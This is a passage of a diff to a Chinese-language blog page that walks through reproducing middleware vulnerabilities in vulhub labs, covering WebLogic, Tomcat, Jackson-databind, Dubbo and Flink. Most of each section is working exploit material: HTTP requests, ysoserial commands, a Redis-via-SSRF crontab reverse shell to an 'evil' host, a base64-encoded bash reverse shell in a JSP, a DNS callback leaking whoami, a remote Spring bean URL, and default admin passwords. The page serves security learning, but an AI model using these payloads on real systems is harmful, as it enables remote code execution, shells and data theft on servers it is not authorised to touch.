+&lt;&#x2F;soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -923,12 +923,12 @@ Content-Length: 638
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub搭建环境，执行如下命令启动Weblogic 10.3.6.0：等待环境启动，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/console%EF%BC%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B4%E4%B8%AA%E7%8E%AF%E5%A2%83">http://your-ip:7001/console，初始化整个环境</a></p>
 <p>首先下载ysoserial，并启动一个JRMP Server：</p>
-<pre class="language-none"><code class="language-none">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后，使用<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">exploit.py</a>脚本，向目标Weblogic（<a href="http://your-ip:7001）发送数据包v">http://your-ip:7001）发送数据包v</a></p>
-<pre class="language-none"><code class="language-none">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
+<pre class="line-numbers language-none"><code class="language-none">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
 
-&#x2F;&#x2F; [victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地ysoserial的路径，[JRMPListener ip]和[JRMPListener port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2</code></pre>
+&#x2F;&#x2F; [victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地ysoserial的路径，[JRMPListener ip]和[JRMPListener port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -940,12 +940,12 @@ Content-Length: 638
 <p>使用vulhub搭建环境，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/uddiexplorer/%EF%BC%8C%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8Buddiexplorer%E5%BA%94%E7%94%A8">http://your-ip:7001/uddiexplorer/，无需登录即可查看uddiexplorer应用</a></p>
 <p><strong>SSRF漏洞测试</strong></p>
 <p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1:80</a></p>
-<pre class="language-none"><code class="language-none">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001 HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001 HTTP&#x2F;1.1
 Host: localhost
 Accept: *&#x2F;*
 Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
-Connection: close</code></pre>
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可访问的端口将会得到错误，一般是返回status code，如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
 <p>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code>，通过错误的不同，即可探测内网状态</p>
@@ -953,30 +953,30 @@ Connection: close</code></pre>
 <p>Weblogic的SSRF虽然是一个“GET”请求，但是可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就可以通过该SSRF攻击内网中的redis服务器</p>
 <p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通</p>
 <p>发送三条redis命令，将弹shell脚本写入&#x2F;etc&#x2F;crontab：</p>
-<pre class="language-none"><code class="language-none">set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;evil&#x2F;21 0&gt;&amp;1&#39;\n\n\n\n&quot;
+<pre class="line-numbers language-none"><code class="language-none">set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;evil&#x2F;21 0&gt;&amp;1&#39;\n\n\n\n&quot;
 config set dir &#x2F;etc&#x2F;
 config set dbfilename crontab
-save</code></pre>
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>进行url编码：</p>
-<pre class="language-none"><code class="language-none">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
+<pre class="line-numbers language-none"><code class="language-none">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
 
-&#x2F;&#x2F; 换行符是“\r\n”，也就是“%0D%0A”</code></pre>
+&#x2F;&#x2F; 换行符是“\r\n”，也就是“%0D%0A”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>将url编码后的字符串放在ssrf的域名后面，发送如下payload，即可成功反弹shell:</p>
-<pre class="language-none"><code class="language-none">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP&#x2F;1.1
 Host: localhost
 Accept: *&#x2F;*
 Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
-Connection: close</code></pre>
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="4-Weblogic-常规渗透"><a href="#4-Weblogic-常规渗透" class="headerlink" title="4. Weblogic 常规渗透"></a>4. Weblogic 常规渗透</h3><p>模拟一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透</p>
 <p><strong>弱口令</strong></p>
 <p>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/console%EF%BC%8C%E5%8D%B3%E4%B8%BAweblogic%E5%90%8E%E5%8F%B0%E3%80%82">http://your-ip:7001/console，即为weblogic后台。</a></p>
 <p>本环境存在弱口令：</p>
-<pre class="language-none"><code class="language-none">weblogic
-Oracle@123</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">weblogic
+Oracle@123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>weblogic常用弱口令： <a target="_blank" rel="noopener" href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a></p>
 <p><strong>任意文件读取漏洞</strong></p>
@@ -1004,7 +1004,7 @@ Oracle@123</code></pre>
 <p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当Tomcat运行在Windows主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件，文件中的代码被服务器执行</p>
 <p><strong>漏洞原理</strong></p>
 <p>漏洞本质Tomcat配置了可写（readonly&#x3D;false），导致我们可以往服务器写文件：</p>
-<pre class="language-none"><code class="language-none">&lt;servlet&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;servlet&gt;
     &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;
     &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;&#x2F;servlet-class&gt;
     &lt;init-param&gt;
@@ -1020,17 +1020,17 @@ Oracle@123</code></pre>
         &lt;param-value&gt;false&lt;&#x2F;param-value&gt;
     &lt;&#x2F;init-param&gt;
     &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt;
-&lt;&#x2F;servlet&gt;</code></pre>
+&lt;&#x2F;servlet&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但使用一些文件系统的特性（如Linux下可用&#x2F;）来绕过限制</p>
 <p><strong>环境搭建</strong></p>
-<pre class="language-none"><code class="language-none">docker-compose build
-docker-compose up -d</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">docker-compose build
+docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>运行完成后访问 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 即可看到Tomcat的Example页面</p>
 <p><strong>漏洞利用</strong></p>
 <p>直接发送以下数据包即可在Web根目录写入shell：</p>
-<pre class="language-none"><code class="language-none">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1
 Host: your-ip:8080
 Accept: *&#x2F;*
 Accept-Language: en
@@ -1039,7 +1039,7 @@ Connection: close
 Content-Type: application&#x2F;x-www-form-urlencoded
 Content-Length: 5
 
-shell</code></pre>
+shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -1053,8 +1053,8 @@ shell</code></pre>
 <p>1）任意文件读取</p>
 <p>工具：<a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
 <p>使用方法：</p>
-<pre class="language-none"><code class="language-none">#python CNVD-2020-10487-Tomcat-Ajp-lfi.py &lt;目标ip&gt; -p &lt;ajp端口&gt; -f &lt;读取文件&gt;
-python CNVD-2020-10487-Tomcat-Ajp-lfi.py target_host -p 8009 -f WEB-INF&#x2F;web.xml</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">#python CNVD-2020-10487-Tomcat-Ajp-lfi.py &lt;目标ip&gt; -p &lt;ajp端口&gt; -f &lt;读取文件&gt;
+python CNVD-2020-10487-Tomcat-Ajp-lfi.py target_host -p 8009 -f WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <ol start="2">
 <li>文件包含</li>
@@ -1062,21 +1062,21 @@ python CNVD-2020-10487-Tomcat-Ajp-lfi.py target_host -p 8009 -f WEB-INF&#x2F;web
 <p>本地包含的条件是需要目标web应用上有一个上传点，能上传txt或jpg等文件，才能进行文件包含的利用。在这用vulhub搭建环境，所以直接进入docker容器创建txt文件进行文件包含的利用</p>
 <p>工具：<a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
 <p>进入docker容器，在&#x2F;webapps&#x2F;ROOT&#x2F;目录下添加ping.txt文件，内容为：</p>
-<pre class="language-none"><code class="language-none">#ping.txt
-&lt;%Runtime.getRuntime().exec(&quot;ping -c 4 &#96;whoami&#96;.name.ceye.cn&quot;);%&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">#ping.txt
+&lt;%Runtime.getRuntime().exec(&quot;ping -c 4 &#96;whoami&#96;.name.ceye.cn&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>利用poc进行文件包含执行漏洞：</p>
-<pre class="language-none"><code class="language-none">python3 ajpShooter.py http:&#x2F;&#x2F;192.168.234.138 8009 &#x2F;ping.txt eval</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python3 ajpShooter.py http:&#x2F;&#x2F;192.168.234.138 8009 &#x2F;ping.txt eval<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ol start="3">
 <li>反弹shell</li>
 </ol>
 <p>反弹shell base64加密：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
 <p>将文件命名为shell.txt上传服务器：</p>
-<pre class="language-none"><code class="language-none">&lt;%Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>利用ajpShooter.py脚本执行文件包含漏洞</p>
-<pre class="language-none"><code class="language-none">python3 ajpShooter.py http:&#x2F;&#x2F;target_host 8009 &#x2F;cmd.txt eval</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python3 ajpShooter.py http:&#x2F;&#x2F;target_host 8009 &#x2F;cmd.txt eval<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>监听端口，成功反弹shell</p>
 <p>refer:</p>
@@ -1087,17 +1087,17 @@ python CNVD-2020-10487-Tomcat-Ajp-lfi.py target_host -p 8009 -f WEB-INF&#x2F;web
 <h3 id="3-Tomcat7-弱口令-amp-amp-后台getshell漏洞"><a href="#3-Tomcat7-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="3. Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>3. Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h3><p><strong>环境说明</strong></p>
 <p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p>
 <p>Tomcat7+权限分为：</p>
-<pre class="language-none"><code class="language-none">manager（后台管理）
+<pre class="line-numbers language-none"><code class="language-none">manager（后台管理）
 manager-gui 拥有html页面权限
 manager-status 拥有查看status的权限
 manager-script 拥有text接口的权限，和status权限
 manager-jmx 拥有jmx权限，和status权限
 host-manager（虚拟主机管理）
 admin-gui 拥有html页面权限
-admin-script 拥有text接口权限</code></pre>
+admin-script 拥有text接口权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在conf&#x2F;tomcat-users.xml文件中配置用户的权限</p>
-<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
 &lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;
               xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
               xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;
@@ -1111,28 +1111,28 @@ admin-script 拥有text接口权限</code></pre>
     &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;
     &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;
     
-&lt;&#x2F;tomcat-users&gt;</code></pre>
+&lt;&#x2F;tomcat-users&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>可见，用户tomcat拥有上述所有权限，密码是tomcat。正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。</p>
 <p><strong>漏洞测试</strong></p>
 <p>使用vulhub搭建环境，打开tomcat管理页面 <a target="_blank" rel="noopener" href="http://your-ip:8080/manager/html%EF%BC%8C%E8%BE%93%E5%85%A5%E5%BC%B1%E5%AF%86%E7%A0%81tomcat:tomcat%EF%BC%8C%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%B0%EF%BC%9B%E4%B8%8A%E4%BC%A0war%E5%8C%85%E5%8D%B3%E5%8F%AF%E7%9B%B4%E6%8E%A5getshell">http://your-ip:8080/manager/html，输入弱密码tomcat:tomcat，即可访问后台；上传war包即可直接getshell</a></p>
 <h2 id="0x08-FasterXML-Jackson"><a href="#0x08-FasterXML-Jackson" class="headerlink" title="0x08 FasterXML Jackson"></a>0x08 FasterXML Jackson</h2><h3 id="Jackson-databind-反序列化漏洞（CVE-2017-7525）"><a href="#Jackson-databind-反序列化漏洞（CVE-2017-7525）" class="headerlink" title="Jackson-databind 反序列化漏洞（CVE-2017-7525）"></a>Jackson-databind 反序列化漏洞（CVE-2017-7525）</h3><p>Jackson-databind 支持 Polymorphic Deserialization 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行</p>
 <p><strong>漏洞利用条件</strong></p>
-<pre class="language-none"><code class="language-none">1) 开启 JacksonPolymorphicDeserialization，即调用以下任意方法
+<pre class="line-numbers language-none"><code class="language-none">1) 开启 JacksonPolymorphicDeserialization，即调用以下任意方法
 
 objectMapper.enableDefaultTyping(); &#x2F;&#x2F; default to using DefaultTyping.OBJECT_AND_NON_CONCRETE
 objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
 
 2) Target class 需要有无参 constructor
 
-3) Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 &#x2F; 实现接口</code></pre>
+3) Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 &#x2F; 实现接口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub搭建环境，Web运行在 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080/</a></p>
 <p><strong>CVE-2017-7525</strong></p>
 <p>Jackson-databind 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 SetterlessProperty 调用 getter 方法，获取变量，然后设置变量值。当调用 getOutputProperties() 方法时，会初始化 transletBytecodes 包含字节码的类，导致命令执行，具体可参考 java-deserialization-jdk7u21-gadget-note 中关于 TemplatesImpl 的说明。</p>
 <p>使用JDK7u21的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl作为Gadget，发送如下请求，将会执行touch &#x2F;tmp&#x2F;prove1.txt</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;exploit HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;exploit HTTP&#x2F;1.1
 Host: your-ip:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -1153,13 +1153,13 @@ Content-Length: 1298
       &quot;outputProperties&quot;: &#123;&#125;
     &#125;
   ]
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>CVE-2017-17485</strong></p>
 <p>CVE-2017-7525 黑名单修复绕过，利用了 org.springframework.context.support.FileSystemXmlApplicationContext。</p>
 <p>原理：利用 FileSystemXmlApplicationContext 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 start() 方法实现命令执行</p>
 <p>利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如 <a target="_blank" rel="noopener" href="http://evil/spel.xml%EF%BC%8C%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B">http://evil/spel.xml，内容如下</a></p>
-<pre class="language-none"><code class="language-none">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;
+<pre class="line-numbers language-none"><code class="language-none">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;
        xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;
        xsi:schemaLocation&#x3D;&quot;
      http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans
@@ -1174,10 +1174,10 @@ Content-Length: 1298
         &lt;&#x2F;constructor-arg&gt;
         &lt;property name&#x3D;&quot;any&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;
     &lt;&#x2F;bean&gt;
-&lt;&#x2F;beans&gt;</code></pre>
+&lt;&#x2F;beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后，发送如下数据包，使Jackson加载bean，触发漏洞：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;exploit HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;exploit HTTP&#x2F;1.1
 Host: your-ip:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -1192,7 +1192,7 @@ Content-Length: 138
     &quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;,
     &quot;http:&#x2F;&#x2F;evil&#x2F;spel.xml&quot;
   ]
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -1207,12 +1207,12 @@ Content-Length: 138
 <p>使用vulhub搭建环境，启动一个Apache Dubbo 2.7.3 Provider：服务启动后，访问 <a href="http://your-ip:8080，服务器默认会返回500错误">http://your-ip:8080，服务器默认会返回500错误</a></p>
 <p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p>
 <p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，本地下载Zookeeper，使用其中自带的zkCli即可连接到这台Zookeeper服务器：</p>
-<pre class="language-none"><code class="language-none">.&#x2F;zkCli -server target-ip:2181</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;zkCli -server target-ip:2181<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>连接后进入一个交互式控制台，使用ls即可列出其中所有节点，包括Dubbo相关的配置</p>
 <p>获取到RPC接口名为org.vulhub.api.CalcService。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到 <a target="_blank" rel="noopener" href="http://your-ip:8080/org.vulhub.api.CalcService">http://your-ip:8080/org.vulhub.api.CalcService</a> 即可触发反序列化漏洞</p>
-<pre class="language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections6 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; 1.poc
-curl -XPOST --data-binary @1.poc http:&#x2F;&#x2F;your-ip:8080&#x2F;org.vulhub.api.CalcService</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections6 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; 1.poc
+curl -XPOST --data-binary @1.poc http:&#x2F;&#x2F;your-ip:8080&#x2F;org.vulhub.api.CalcService<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -1224,7 +1224,7 @@ curl -XPOST --data-binary @1.poc http:&#x2F;&#x2F;your-ip:8080&#x2F;org.vulhub.a
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub搭建环境，启动 Apache Flink jobmanager 1.11.2：Apache Flink 启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8081/">http://your-ip:8081</a> 查看主页</p>
 <p>发送如下请求上传文件到 &#x2F;tmp&#x2F;success</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1
 Host: localhost:8081
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -1238,13 +1238,13 @@ Content-Length: 187
 Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;
 
 success
-------WebKitFormBoundaryoZ8meKnrrso89R6Y--</code></pre>
+------WebKitFormBoundaryoZ8meKnrrso89R6Y--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="2-Apache-Flinkjobmanager-x2F-logs路径遍历-CVE-2020-17519"><a href="#2-Apache-Flinkjobmanager-x2F-logs路径遍历-CVE-2020-17519" class="headerlink" title="2. Apache Flinkjobmanager&#x2F;logs路径遍历 (CVE-2020-17519)"></a>2. Apache Flinkjobmanager&#x2F;logs路径遍历 (CVE-2020-17519)</h3><p>Apache Flink 1.11.0 中引入的一项更改（也在 1.11.1 和 1.11.2 中发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件</p>
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub搭建环境，启动 Apache Flink jobmanager 1.11.2：Apache Flink 启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8081/">http://your-ip:8081</a> 查看主页</p>
